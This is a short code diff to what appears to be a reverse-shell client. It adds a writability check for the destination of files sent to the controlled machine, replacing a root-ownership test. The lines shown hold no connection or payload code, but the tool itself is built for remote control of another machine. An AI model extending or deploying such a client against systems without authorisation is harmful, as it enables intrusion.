@@ -55,6 +55,13 @@ def resolve_path(path: str) -> str:
         return str(Path(path).expanduser())
     return str(Path(path).absolute())
 
+def check_permission(file: str) -> bool:
+    try:
+        with open(file, 'a'):
+            return True
+    except PermissionError:
+        return False
+
 
 class ReverseShellClient:
     """
@@ -241,7 +248,7 @@ class ReverseShellClient:
                     if not Path(destination_path).is_dir():
                         await self.send_output(self.setup_data(stderr=f'{destination_path} is not a Directory', stdout=''))
                         continue
-                    if Path(destination_path).owner() == 'root':
+                    if not check_permission(destination_path):
                         await self.send_output(self.setup_data(stdout='', stderr=f'Permission denied: {destination_path}'))
                         continue
                     save_path = Path(destination_path) / file_name
